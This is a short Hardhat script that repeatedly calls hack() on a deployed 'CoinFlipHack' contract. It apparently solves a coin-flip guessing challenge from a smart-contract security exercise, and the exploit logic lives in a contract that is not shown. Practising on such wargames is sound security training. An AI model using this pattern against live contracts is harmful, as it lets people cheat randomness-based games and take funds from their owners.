const { ethers } = require("hardhat");
const hre = require("hardhat");

const main = async () => {
  /*const contractFactory = await hre.ethers.getContractFactory("CoinFlipHack");
  const contract = await contractFactory.deploy();
  await contract.deployed();
  console.log("=== contract deployed to ", contract.address);
  */
  const hackContractAddress = "0x0a5DB55a90549717aA976bF1add882F3b30ad6CE";
  const hackContractName = "CoinFlipHack";
  const signer = await hre.ethers.getSigner();
  const contract = await hre.ethers.getContractAt(
    hackContractName,
    hackContractAddress,
    signer
  );

  console.log("=== flip 1 ===");
  const tx1 = await contract.hack({
    gasLimit: 200000,
  });

  console.log("=== flip 2 ===");
  const tx2 = await contract.hack({
    gasLimit: 200000,
  });

  console.log("=== flip 3 ===");
  const tx3 = await contract.hack({
    gasLimit: 200000,
  });

  console.log("=== flip 4 ===");
  const tx4 = await contract.hack({
    gasLimit: 200000,
  });
  console.log("=== flip 5 ===");
  const tx5 = await contract.hack({
    gasLimit: 200000,
  });
  console.log("=== DONE ===");
};

const runMain = (async () => {
  try {
    await main();
    process.exit(0);
  } catch (error) {
    console.log(error);
    process.exit(1);
  }
})();
